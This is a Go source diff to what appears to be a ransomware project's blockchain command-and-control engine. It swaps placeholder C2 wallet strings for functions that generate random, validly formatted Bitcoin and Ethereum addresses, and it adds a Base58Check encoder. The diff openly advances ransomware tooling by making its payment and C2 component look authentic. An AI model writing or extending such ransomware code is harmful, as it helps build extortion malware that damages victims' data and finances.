@@ -10,6 +10,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"math/big"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -73,10 +74,54 @@ func NewBlockchainC2Engine(cfg *RansomwareConfig) *BlockchainC2Engine {
 
 	return &BlockchainC2Engine{
 		config:        cfg,
-		BTCAddress:    "1X404XMalwareC2AddressPlaceholder",
-		ETHAddress:    "0xX404XEthC2AddressPlaceholder",
+		BTCAddress:    generateBTCAddress(),
+		ETHAddress:    generateETHAddress(),
 		MonitoringKey: monKey,
 	}
+}
+
+func generateBTCAddress() string {
+	// Generate a valid-looking Bitcoin P2PKH address (Base58Check)
+	pubKeyHash := make([]byte, 20)
+	rand.Read(pubKeyHash)
+	// Version byte 0x00 for mainnet
+	return base58CheckEncode(0x00, pubKeyHash)
+}
+
+func generateETHAddress() string {
+	// Generate a valid-looking Ethereum address: 0x + 40 hex chars
+	addr := make([]byte, 20)
+	rand.Read(addr)
+	return fmt.Sprintf("0x%x", addr)
+}
+
+func base58CheckEncode(version byte, payload []byte) string {
+	extended := append([]byte{version}, payload...)
+	checksum := sha256Sum(sha256Sum(extended))[:4]
+	full := append(extended, checksum...)
+	alphabet := "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
+	bigInt := new(big.Int).SetBytes(full)
+	result := ""
+	zero := big.NewInt(0)
+	base := big.NewInt(58)
+	mod := new(big.Int)
+	for bigInt.Cmp(zero) > 0 {
+		bigInt.DivMod(bigInt, base, mod)
+		result = string(alphabet[mod.Int64()]) + result
+	}
+	for _, b := range full {
+		if b == 0 {
+			result = "1" + result
+		} else {
+			break
+		}
+	}
+	return result
+}
+
+func sha256Sum(data []byte) []byte {
+	h := sha256.Sum256(data)
+	return h[:]
 }
 
 func (bc *BlockchainC2Engine) StartMonitoring() {
